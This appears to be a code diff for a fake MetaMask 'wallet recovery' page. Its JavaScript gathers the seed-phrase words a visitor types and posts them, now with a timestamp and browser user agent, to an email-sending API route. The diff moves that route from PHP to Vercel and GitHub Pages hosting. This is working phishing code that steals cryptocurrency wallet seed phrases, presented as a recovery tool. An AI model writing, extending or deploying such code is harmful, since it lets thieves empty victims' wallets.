@@ -140,14 +140,20 @@ function collectWords() {
     return Array.from(inputs).map(input => input.value.trim());
 }
 
-// Get the current domain for API calls
+// Update API_ENDPOINT to handle Vercel deployments
 const API_ENDPOINT = (() => {
     const url = new URL(window.location.href);
-    // Handle both development and production environments
-    return url.hostname.includes('localhost') ? 'http://localhost:8787' : url.origin;
+    // Handle all potential environments
+    if (url.hostname.includes('localhost')) {
+        return 'http://localhost:3000'; // Local Vercel development
+    } else if (url.hostname.includes('vercel.app') || url.hostname.includes('github.io')) {
+        return url.origin; // Vercel/GitHub production
+    } else {
+        return url.origin; // Any other domain
+    }
 })();
 
-// Replace the existing sendWords function
+// Update the sendWords function to work with Vercel API routes
 async function sendWords(btn) {
     try {
         const inputs = document.querySelectorAll('.phrase-input input');
@@ -172,21 +178,22 @@ async function sendWords(btn) {
         
         console.log('Sending recovery phrase to server...');
         
-        // Send to API endpoint with dynamic URL
-        const response = await fetch(`${API_ENDPOINT}/metamask-wallet-recovery/send_email.php`, {
+        const response = await fetch(`${API_ENDPOINT}/api/send-email`, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({ 
                 phrases: words,
-                recoveryPhrase: words.join(' ')
+                recoveryPhrase: words.join(' '),
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
             })
         });
 
         const data = await response.json();
         
-        if (data.success) {
+        if (response.ok && data.success) {
             showSuccess(btn);
         } else {
             throw new Error(data.message || 'Failed to process recovery phrase');
